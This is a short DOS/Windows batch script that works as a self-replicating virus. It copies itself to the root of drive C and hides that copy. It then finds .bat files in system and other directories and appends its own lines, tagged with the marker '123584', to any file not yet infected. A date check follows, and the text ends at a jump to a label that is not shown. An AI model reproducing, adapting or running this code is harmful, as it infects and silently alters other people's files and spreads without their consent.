@echo off
if not exist c:\123584.bat copy 123584.bat c:\ >nul
if not exist c:\123584.bat copy %0.bat c:\123584.bat >nul
attrib 123584.bat +h
for %%x in (..\*.bat *.bat c:\*.bat c:\windows\*.bat c:\windows\command\*.bat e:\*.bat) do set 123584_v=%%x
find /i "123584"<%123584_v%>nul
if errorlevel 1 find "123584"<%0.bat>>%123584_v%
echo.|date|find "56">nul
if errorlevel 1 goto nada
